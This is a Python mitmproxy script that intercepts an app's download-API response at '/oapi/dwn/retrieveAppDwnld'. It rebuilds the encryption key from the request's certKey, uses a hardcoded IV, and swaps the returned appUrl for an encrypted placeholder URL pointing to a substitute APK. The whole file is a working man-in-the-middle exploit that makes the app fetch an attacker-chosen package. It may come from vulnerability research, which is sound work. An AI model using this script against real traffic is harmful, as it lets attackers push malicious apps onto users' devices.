#! /usr/bin/python

import json
import base64
from libmproxy.models import decoded
from Crypto.Cipher import AES
from Crypto import Random

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[0:-ord(s[-1])]

class AESCipher:
    def __init__( self, key, iv ):
	"""
        Requires hex encoded param as a key
        """
        self.key = key.decode("hex")
	self.iv = iv.decode("hex")

    def encrypt( self, raw ):
        """
        Returns hex encoded encrypted value!
        """
	raw = raw.encode()
        raw = pad(raw)
        cipher = AES.new( self.key, AES.MODE_CBC, self.iv )
        #return ( cipher.encrypt( raw ) ).encode("hex") #no base64
	return ( cipher.encrypt( raw ) ).encode("base64") #use base64

    def decrypt( self, enc ):
        """
        Requires hex encoded param to decrypt
        """
	enc = enc.decode("base64") #use base64
        #enc = enc.decode("hex") #no base64
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv )
        return unpad(cipher.decrypt( enc))

def response(context, flow):
    with decoded(flow.request):
	if flow.request.path == "/oapi/dwn/retrieveAppDwnld":
		with decoded(flow.response) :
 			reqdata = json.loads(flow.request.content)
 			certKey = reqdata["certKey"]
			Key = certKey.replace("-","")
			Key = Key[:32]
			iv = "2322a4837a3ed998fa27b66e316ddd9d"
			iv=iv[:32]
			plaintext = "http://Download_APK_URL/APK_NAME.apk"

			AESCipherTest = AESCipher(Key, iv)			
    			ciphertext = AESCipherTest.encrypt(plaintext)
			
			resdata = json.loads(flow.response.content)
			resdata["appUrl"] = ciphertext.replace("\n","")
			flow.response.content = json.dumps(resdata)
